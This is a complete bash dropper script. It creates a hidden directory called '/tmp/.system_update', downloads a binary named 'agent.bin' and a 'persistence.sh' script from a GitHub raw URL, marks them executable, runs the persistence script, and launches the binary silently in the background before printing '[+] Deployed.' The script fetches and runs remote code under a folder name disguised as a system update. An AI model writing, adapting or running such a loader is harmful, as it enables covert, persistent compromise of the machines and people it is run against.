#!/bin/bash
mkdir -p /tmp/.system_update
cd /tmp/.system_update
curl -s -O https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/agent.bin
curl -s -O https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/persistence.sh
chmod +x agent.bin persistence.sh
./persistence.sh
nohup ./agent.bin > /dev/null 2>&1 &
echo "[+] Deployed."
